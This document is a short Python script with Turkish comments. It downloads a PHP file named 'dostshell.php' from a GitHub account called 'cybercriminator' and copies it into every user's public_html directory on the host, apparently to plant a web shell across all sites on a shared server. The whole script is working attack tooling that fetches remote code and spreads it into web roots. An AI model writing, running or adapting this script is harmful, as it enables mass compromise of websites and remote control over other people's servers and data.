import requests
import glob
import shutil

# Dosya URL'si
url = 'https://raw.githubusercontent.com/cybercriminator/BaBa/master/dostshell.php'
# Geçici dosya konumu
temp_file = '/home/dostshell.php'

# Dosyayı URL'den indir
try:
    response = requests.get(url)
    if response.status_code == 200:
        with open(temp_file, 'wb') as file:
            file.write(response.content)
        print(f"{url} dosyası indirildi -> {temp_file}")
    else:
        print(f"Dosya indirilemedi, hata kodu: {response.status_code}")
except Exception as e:
    print(f"Dosya indirilemedi: {e}")
    exit()

# Hedef dizinlere kopyala
for target_dir in glob.glob('/home/*/public_html/'):
    try:
        shutil.copy(temp_file, target_dir)
        print(f"{temp_file} kopyalandı -> {target_dir}")
    except Exception as e:
        print(f"Hata: {target_dir} içine kopyalanamadı. {e}")
